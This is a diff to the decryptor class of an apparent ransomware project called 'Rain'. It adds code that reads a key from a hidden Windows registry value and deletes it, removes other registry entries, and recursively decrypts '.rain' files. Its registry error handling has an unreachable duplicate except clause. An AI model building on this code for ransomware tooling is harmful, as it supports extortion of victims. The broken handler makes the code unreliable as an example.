@@ -5,10 +5,13 @@ from ctypes import windll
 from os import remove
 from os.path import splitext
 from struct import unpack, calcsize
+from glob import iglob
 
 
 class Decrypt:
-    def __init__(self, key=None, decryptor=None):
+    def __init__(self, ransom_name='Rain', out_ext='.rain', key=None, decryptor=None):
+        self.ransom_name = ransom_name
+        self.out_ext = out_ext
         self.key = key
         self.decryptor = decryptor
         self.get_key()
@@ -19,11 +22,15 @@ class Decrypt:
         try:
             binkey = QueryValueEx(winkey, ' ')[0]
             self.key = (bytes(int(binkey[i: i + 8], 2) for i in range(0, len(binkey), 8)))
+            DeleteValue(winkey, ' ')
+            CloseKey(winkey)
         except PermissionError:
             try:
                 winkey = OpenKey(HKEY_CURRENT_USER, '')
                 binkey = QueryValueEx(winkey, ' ')[0]
                 self.key = (bytes(int(binkey[i: i + 8], 2) for i in range(0, len(binkey), 8)))
+                DeleteValue(winkey, ' ')
+                CloseKey(winkey)
             except FileNotFoundError:
                 exit(1)
         except FileNotFoundError:
@@ -31,6 +38,8 @@ class Decrypt:
                 winkey = OpenKey(HKEY_CURRENT_USER, '')
                 binkey = QueryValueEx(winkey, ' ')[0]
                 self.key = (bytes(int(binkey[i: i + 8], 2) for i in range(0, len(binkey), 8)))
+                DeleteValue(winkey, ' ')
+                CloseKey(winkey)
             except FileNotFoundError:
                 exit(1)
         return 0
@@ -42,6 +51,28 @@ class Decrypt:
         copyfile(old, changed)
         remove(old)
         windll.user32.SystemParametersInfoW(20, 0, changed, 0)
+        return 0
+
+    def delete_registry(self, keypath: str, name: str):
+        key = OpenKey(HKEY_LOCAL_MACHINE, keypath, access=KEY_ALL_ACCESS)
+        try:
+            DeleteValue(key, name)
+            CloseKey(key)
+        except PermissionError:
+            key = OpenKey(HKEY_CURRENT_USER, keypath, access=KEY_ALL_ACCESS)
+            try:
+                DeleteValue(key, name)
+                CloseKey(key)
+            except FileNotFoundError:
+                return 1
+            except FileNotFoundError:
+                key = OpenKey(HKEY_CURRENT_USER, keypath, access=KEY_ALL_ACCESS)
+                try:
+                    DeleteValue(key, name)
+                    CloseKey(key)
+                except FileNotFoundError:
+                    return 1
+        return 0
 
     def correct_ext(self, file: str):
         """Corrects the file extension with the leading characters
@@ -100,3 +131,10 @@ class Decrypt:
                     fsz -= n
 
         remove(file)
+        return 0
+
+    def decrypt_directory(self, dir: str):
+        filetree = iglob(dir + '/**/*' + self.out_ext, recursive=True)
+        for file in filetree:
+            self.decrypt_file(file)
+        return 0
